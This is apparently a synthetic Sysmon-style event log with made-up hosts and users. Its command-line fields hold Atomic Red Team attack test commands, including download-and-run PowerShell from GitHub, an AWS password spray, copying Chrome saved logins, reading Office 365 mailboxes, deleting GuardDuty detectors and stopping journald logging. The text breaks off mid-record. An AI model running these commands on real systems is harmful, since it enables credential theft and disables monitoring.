    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-67.jordan.biz",
        "User": "angelaanderson",
        "ProcessID": 4707,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cd /tmp\\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\\ncd /tmp/GoAWSConsoleSpray\\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\\n\",",
        "LogonID": 765704,
        "LogonGuid": "af256374-6358-4f50-9dfe-2fb17e135a4d",
        "SourceProcessID": 5263,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\board..exe",
        "DestinationProcessID": 4042,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\might..dll",
        "UtcTime": "2024-05-17T01:36:51.665612Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-74.watkins-mahoney.org",
        "User": "millerjessica",
        "ProcessID": 9313,
        "ProcessName": "malware.exe",
        "CommandLine": "\"echo [InternetShortcut] > #{shortcut_file_path}\\necho URL=C:\\\\windows\\\\system32\\\\calc.exe >> #{shortcut_file_path}\\n#{shortcut_file_path}\\n\",",
        "LogonID": 542647,
        "LogonGuid": "bbaaf188-4820-41f3-95ab-7496806fdcbf",
        "SourceProcessID": 7966,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\loss..dll",
        "DestinationProcessID": 2586,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\notice..exe",
        "UtcTime": "2024-05-17T01:36:51.665612Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-64.smith.com",
        "User": "aguerrero",
        "ProcessID": 6895,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"wmic.exe /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\",",
        "LogonID": 185447,
        "LogonGuid": "087bce4a-3316-4eae-adad-ff925209b052",
        "SourceProcessID": 8083,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\go..dll",
        "DestinationProcessID": 2378,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\itself..exe",
        "UtcTime": "2024-05-17T01:36:51.665612Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-07.chandler.com",
        "User": "zduke",
        "ProcessID": 9264,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}\",",
        "LogonID": 571902,
        "LogonGuid": "40f53418-9ded-4021-b8b7-f8b819e5ff9f",
        "SourceProcessID": 1155,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\exist..dll",
        "DestinationProcessID": 8509,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\tend..exe",
        "UtcTime": "2024-05-17T01:36:51.666620Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-70.meadows.com",
        "User": "hrivera",
        "ProcessID": 9294,
        "ProcessName": "nc.exe",
        "CommandLine": "\"get-localgroup\\nGet-LocalGroupMember -Name \\\"Administrators\\\"\\n\",",
        "LogonID": 895454,
        "LogonGuid": "05befd20-0044-4dd1-877c-bf740af4082e",
        "SourceProcessID": 9689,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\employee..dll",
        "DestinationProcessID": 3934,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\staff..dll",
        "UtcTime": "2024-05-17T01:36:51.666620Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-66.hudson-hanson.net",
        "User": "johnzavala",
        "ProcessID": 1679,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Start-Process -FilePath \\\"C:Program Files (x86)\\\\Splashtop\\\\Splashtop Remote\\\\Server\\\\#{srserver_exe}\\\"\",",
        "LogonID": 166892,
        "LogonGuid": "e0173405-ca2f-4ca9-b8f6-86d9f4ab94f0",
        "SourceProcessID": 4551,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\increase..exe",
        "DestinationProcessID": 3029,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\among..dll",
        "UtcTime": "2024-05-17T01:36:51.666620Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-43.conley.com",
        "User": "stacey84",
        "ProcessID": 6240,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"New-Item -ItemType Directory -path \\\"#{new_startup_folder}\\\"\\nCopy-Item -path \\\"#{payload}\\\" -destination \\\"#{new_startup_folder}\\\"\\nSet-ItemProperty -Path  \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders\\\" -Name \\\"Common Startup\\\" -Value \\\"#{new_startup_folder}\\\"\\n\",",
        "LogonID": 622156,
        "LogonGuid": "d0fc5425-9c8a-44c6-bae4-ec1fb491d885",
        "SourceProcessID": 8016,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\just..dll",
        "DestinationProcessID": 8529,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\every..exe",
        "UtcTime": "2024-05-17T01:36:51.666620Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-26.hawkins-caldwell.com",
        "User": "karen91",
        "ProcessID": 3229,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" #{optional_args} -sc dclist\\n\",",
        "LogonID": 806876,
        "LogonGuid": "5969685e-ed05-4bf5-9f1b-11f546bc668b",
        "SourceProcessID": 3924,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\reason..exe",
        "DestinationProcessID": 4430,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\week..exe",
        "UtcTime": "2024-05-17T01:36:51.667620Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-60.bennett.biz",
        "User": "paula31",
        "ProcessID": 4393,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')\",",
        "LogonID": 635338,
        "LogonGuid": "4aa8dd36-51d1-4d1b-a875-60dfbca3e45d",
        "SourceProcessID": 2238,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\leg..exe",
        "DestinationProcessID": 4698,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\interesting..dll",
        "UtcTime": "2024-05-17T01:36:51.667620Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-94.welch.com",
        "User": "lewisjennifer",
        "ProcessID": 5302,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\\n\",",
        "LogonID": 884028,
        "LogonGuid": "001759b6-2a4d-44e3-b311-cecdfb69a1ab",
        "SourceProcessID": 5045,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\child..exe",
        "DestinationProcessID": 8393,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\wide..dll",
        "UtcTime": "2024-05-17T01:36:51.667620Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-16.vasquez-smith.info",
        "User": "joneskristen",
        "ProcessID": 5743,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"\\\"#{Path_to_file}\\\" 1>NUL \\n\",",
        "LogonID": 602143,
        "LogonGuid": "53573178-ac6d-402b-b2a6-bbb1b88a406a",
        "SourceProcessID": 6712,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\company..exe",
        "DestinationProcessID": 7765,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\get..dll",
        "UtcTime": "2024-05-17T01:36:51.667620Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-00.reynolds-bailey.com",
        "User": "heathereverett",
        "ProcessID": 3188,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Set-Location -path \\\"#{file_path}\\\\Sysinternals\\\";\\n./accesschk.exe -accepteula .;\\n\",",
        "LogonID": 795905,
        "LogonGuid": "99b811f7-3aa6-4560-83f0-c215600d64f3",
        "SourceProcessID": 9248,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\possible..exe",
        "DestinationProcessID": 6877,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\worry..dll",
        "UtcTime": "2024-05-17T01:36:51.667620Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-24.grant.org",
        "User": "krhodes",
        "ProcessID": 4335,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Enable-PSRemoting -Force\\n\",",
        "LogonID": 752215,
        "LogonGuid": "bd5ec7d2-f9b7-4403-81fa-e058e7e0e20e",
        "SourceProcessID": 5847,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\similar..dll",
        "DestinationProcessID": 5133,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\beyond..exe",
        "UtcTime": "2024-05-17T01:36:51.668623Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-91.rowe.com",
        "User": "wardchristina",
        "ProcessID": 1971,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$OriginalCommand = '#{powershell_command}'\\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\\n$EncodedCommand\\npowershell.exe -EncodedCommand $EncodedCommand\\n\",",
        "LogonID": 664780,
        "LogonGuid": "8e90273c-822f-45f0-8d8d-c606f779356a",
        "SourceProcessID": 8702,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\side..dll",
        "DestinationProcessID": 5192,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\wide..exe",
        "UtcTime": "2024-05-17T01:36:51.668623Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-26.tucker-padilla.info",
        "User": "saguilar",
        "ProcessID": 1063,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$TokenSet = @{\\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\\n  N = [Char[]]'0123456789'\\n}\\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\\n$StringSet = $Upper + $Number\\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\\n$file = \\\"rad\\\" + $rad + \\\".tmp\\\"\\n\\nwhoami.exe /all >> #{output_path}\\\\$file\\n\",",
        "LogonID": 863828,
        "LogonGuid": "88ea0967-8aa8-4bb3-a7b5-8800c198d701",
        "SourceProcessID": 8607,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\film..dll",
        "DestinationProcessID": 9482,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\forget..exe",
        "UtcTime": "2024-05-17T01:36:51.668623Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-57.garcia-russell.com",
        "User": "rmann",
        "ProcessID": 4594,
        "ProcessName": "malware.exe",
        "CommandLine": "\"detectorId=$(aws guardduty create-detector --enable --region \\\"#{region}\\\" | grep -oP '(?<=\\\"DetectorId\\\": \\\")[^\\\"]*')\\naws guardduty update-detector --no-enable --detector-id $detectorId\\naws guardduty delete-detector --detector-id $detectorId\\n\",",
        "LogonID": 883387,
        "LogonGuid": "a17b8348-6ee5-47f2-9abb-583881b71503",
        "SourceProcessID": 3343,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\down..exe",
        "DestinationProcessID": 2865,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\some..exe",
        "UtcTime": "2024-05-17T01:36:51.668623Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-34.lee.biz",
        "User": "williedeleon",
        "ProcessID": 8449,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"del %TEMP%\\\\PrintBrm.zip >nul 2>&1 \\n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\\\PrintBrm.zip -O FORCE\\n\",",
        "LogonID": 689807,
        "LogonGuid": "98f42437-b7e5-4cbc-a683-ca789b1a071d",
        "SourceProcessID": 3771,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\along..dll",
        "DestinationProcessID": 5157,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\positive..dll",
        "UtcTime": "2024-05-17T01:36:51.668623Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-35.alexander.com",
        "User": "robinsonjesse",
        "ProcessID": 7064,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\\n\",",
        "LogonID": 929620,
        "LogonGuid": "527ce385-9c30-4f1f-87f8-256647c13e86",
        "SourceProcessID": 9010,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\dark..exe",
        "DestinationProcessID": 1124,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\lay..exe",
        "UtcTime": "2024-05-17T01:36:51.669622Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-63.nichols-tapia.net",
        "User": "taylorantonio",
        "ProcessID": 5752,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp\\necho \\\"\\\" | \\\"#{plink_file}\\\" \\\"#{vm_host}\\\" -ssh  -l \\\"#{vm_user}\\\" -pw \\\"#{vm_pass}\\\" -m \\\"#{vib_install}\\\"\\n\",",
        "LogonID": 694475,
        "LogonGuid": "e28e16ad-f5bb-4ecd-b5df-f7390d064f34",
        "SourceProcessID": 1702,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\difficult..exe",
        "DestinationProcessID": 7179,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\write..exe",
        "UtcTime": "2024-05-17T01:36:51.669622Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-45.smith-stephenson.net",
        "User": "sara46",
        "ProcessID": 8038,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"esentutl.exe /y \\\"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\" /d \\\"#{output_path}\\\"\\n\",",
        "LogonID": 446838,
        "LogonGuid": "f16cc847-a85b-4529-a3e5-18432bb610f2",
        "SourceProcessID": 3172,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\team..dll",
        "DestinationProcessID": 7804,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\accept..exe",
        "UtcTime": "2024-05-17T01:36:51.669622Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-71.wright.com",
        "User": "adrian85",
        "ProcessID": 2050,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Set-ItemProperty \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\\" \\\"Userinit\\\" \\\"Userinit.exe, #{binary_to_execute}\\\" -Force\\n\",",
        "LogonID": 337627,
        "LogonGuid": "c45026f9-3b5d-4ad5-8117-87c3cfd9d58e",
        "SourceProcessID": 4212,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\black..exe",
        "DestinationProcessID": 1160,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\pull..exe",
        "UtcTime": "2024-05-17T01:36:51.669622Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-27.sims.org",
        "User": "jordanangela",
        "ProcessID": 2015,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$ss = ConvertTo-SecureString \\\"#{password}\\\" -AsPlainText -Force\\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\\n$param = @{\\n    Credential = $cred\\n    Force      = $true\\n}\\n$null = Connect-AzAccount @param\\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\\n$cert = New-SelfSignedCertificate -Subject \\\"CN=PowerShell Application\\\" -CertStoreLocation \\\"Cert:\\\\CurrentUser\\\\My\\\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\\n$reqResourceAccess = ( @{ \\\"resourceAccess\\\" = (@{\\\"id\\\"= \\\"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{\\\"id\\\"= \\\"37f7f235-527c-4136-accd-4a02d197296e\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{\\\"id\\\"= \\\"14dad69e-099b-42c9-810b-d002981feec1\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"e1fe6dd8-ba31-4d61-89e7-88639da4683d\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"810c84a8-4a9e-49e6-bf7d-12d183f40d01\\\"; \\\"type\\\"= \\\"Role\\\"}); \\\"resourceAppId\\\" = \\\"00000003-0000-0000-c000-000000000000\\\" })\\nconnect-mggraph -AccessToken $token\\n$context = Get-MgContext       \\n$users = get-MgUser\\n$app = New-MgApplication -DisplayName \\\"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\\\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\\\"http://localhost\\\"; } -KeyCredentials @(@{ Type=\\\"AsymmetricX509Cert\\\"; Usage=\\\"Verify\\\"; Key=$cert.RawData })\\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\\n$resourceSPN = Get-MgServicePrincipal -Filter \\\"AppId eq '$($app.AppId)'\\\"\\n$graphApiApp = Get-MgServicePrincipal -Filter \\\"DisplayName eq 'Microsoft Graph'\\\"\\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \\\"Mail.Read\\\"\\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\\n$mailbox1 = \\\"#{1st_target_mailbox}\\\"\\n$mailbox2 = \\\"#{2nd_target_mailbox}\\\"\\n$mailbox3 = \\\"#{3rd_target_mailbox}\\\"\\n[System.Collections.ArrayList]$selectUsers = @()\\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\\nforeach ($user in $selectUsers) { $url= \\\"https://graph.microsoft.com/v1.0/users/$($user)/messages\\\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\\n\",",
        "LogonID": 602511,
        "LogonGuid": "adaf8e6d-0a61-4f37-8e3e-1d2a1650063d",
        "SourceProcessID": 4053,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\part..exe",
        "DestinationProcessID": 8787,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\country..dll",
        "UtcTime": "2024-05-17T01:36:51.669622Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-33.hernandez-davis.info",
        "User": "slynch",
        "ProcessID": 1360,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"echo \\\"#{command}\\\" >> /var/spool/cron/crontabs/#{cron_script_name}\\n\",",
        "LogonID": 552241,
        "LogonGuid": "179953c2-21ae-41e7-91c5-e7ef0ca09c31",
        "SourceProcessID": 1521,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\behind..dll",
        "DestinationProcessID": 4186,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\often..dll",
        "UtcTime": "2024-05-17T01:36:51.670618Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-69.ballard-rowe.com",
        "User": "robert18",
        "ProcessID": 5751,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\\n\",",
        "LogonID": 789887,
        "LogonGuid": "5d3b4c4b-fdf4-4beb-b26f-bec9c6dde1fe",
        "SourceProcessID": 8862,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\then..dll",
        "DestinationProcessID": 5891,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\after..exe",
        "UtcTime": "2024-05-17T01:36:51.670618Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-31.ward.com",
        "User": "phillipphillips",
        "ProcessID": 4236,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\DisallowRun /f /t REG_SZ /v art1 /d \\\"regedit.exe\\\"\\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\DisallowRun /f /t REG_SZ /v art2 /d \\\"cmd.exe\\\"\\n\",",
        "LogonID": 921466,
        "LogonGuid": "c64bf6df-df38-404c-9add-fa18eac3fa31",
        "SourceProcessID": 2037,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\six..dll",
        "DestinationProcessID": 4578,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\certainly..exe",
        "UtcTime": "2024-05-17T01:36:51.670618Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-55.knight.com",
        "User": "michaelhill",
        "ProcessID": 7209,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo systemctl stop systemd-journald #disables journal logging\\n\",",
        "LogonID": 186175,
        "LogonGuid": "53ba4c8a-1df7-42c2-82bf-1cd456f4b7b8",
        "SourceProcessID": 7798,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\both..dll",
        "DestinationProcessID": 2134,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\level..exe",
        "UtcTime": "2024-05-17T01:36:51.670618Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-14.gibson.com",
        "User": "natalie02",
        "ProcessID": 6777,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"cp /bin/sh /tmp/crond;\\necho 'sleep 5' | /tmp/crond\\n\",",
        "LogonID": 853923,
        "LogonGuid": "682a5676-b868-47c8-b242-efa2bfe54583",
        "SourceProcessID": 9381,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\western..exe",
        "DestinationProcessID": 6233,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\ability..exe",
        "UtcTime": "2024-05-17T01:36:51.671619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-62.martin-higgins.info",
        "User": "ustewart",
        "ProcessID": 8079,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"apt install xclip -y\\nhistory | tail -n 30 | xclip -sel clip\\nxclip -o > history.txt\\n\",",
        "LogonID": 853657,
        "LogonGuid": "7d88ea8e-4c0d-45eb-a054-15a666e631b0",
        "SourceProcessID": 5448,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\agent..dll",
        "DestinationProcessID": 3680,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\alone..exe",
        "UtcTime": "2024-05-17T01:36:51.671619Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-03.miller.com",
        "User": "gregory47",
        "ProcessID": 8618,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"if [ \\\"$(uname)\\\" = 'FreeBSD' ]; then cmd=\\\"netstat -Sp tcp\\\"; else cmd=\\\"netstat -ant\\\"; fi;\\nif [ -x \\\"$(command -v arp)\\\" ]; then arp -a; else echo \\\"arp is missing from the machine. skipping...\\\"; fi;\\nif [ -x \\\"$(command -v ifconfig)\\\" ]; then ifconfig; else echo \\\"ifconfig is missing from the machine. skipping...\\\"; fi;\\nif [ -x \\\"$(command -v ip)\\\" ]; then ip addr; else echo \\\"ip is missing from the machine. skipping...\\\"; fi;\\nif [ -x \\\"$(command -v netstat)\\\" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \\\"netstat is missing from the machine. skipping...\\\"; fi;\\n\",",
        "LogonID": 808731,
        "LogonGuid": "db6009f9-dfcc-499f-8d67-2160206f0d24",
        "SourceProcessID": 8393,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\early..exe",
        "DestinationProcessID": 1533,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\population..exe",
        "UtcTime": "2024-05-17T01:36:51.671619Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-01.shah.net",
        "User": "jessica93",
        "ProcessID": 9387,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:#{output_file} \\\"#{input_file}\\\"\\n\",",
        "LogonID": 363669,
        "LogonGuid": "9aa61b0c-d0e2-4830-851c-579815cf29e7",
        "SourceProcessID": 1638,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\west..dll",
        "DestinationProcessID": 7506,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\nice..exe",
        "UtcTime": "2024-05-17T01:36:51.671619Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-39.smith-wright.com",
        "User": "pollardjohn",
        "ProcessID": 9074,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Mount-DiskImage -ImagePath \\\"#{path_of_iso}\\\" -StorageType ISO -Access ReadOnly\\n$keep = Get-Volume -FileSystemLabel \\\"TestIso\\\"\\n$driveLetter = ($keep | Get-Volume).DriveLetter\\ninvoke-item \\\"$($driveLetter):\\\\hello.exe\\\"\\n\",",
        "LogonID": 124019,
        "LogonGuid": "a98719cb-3232-4a44-b281-167473b15346",
        "SourceProcessID": 1478,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\total..exe",
        "DestinationProcessID": 7547,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\time..exe",
        "UtcTime": "2024-05-17T01:36:51.671619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-96.wilkins-hess.com",
        "User": "epage",
        "ProcessID": 3361,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"netstat -r | grep default\\n\",",
        "LogonID": 587957,
        "LogonGuid": "4b301862-7250-413d-8248-15916ce9aa7d",
        "SourceProcessID": 4058,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\ball..exe",
        "DestinationProcessID": 3662,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\short..exe",
        "UtcTime": "2024-05-17T01:36:51.671619Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-15.hurley.com",
        "User": "williamslindsay",
        "ProcessID": 4952,
        "ProcessName": "powershell.exe",
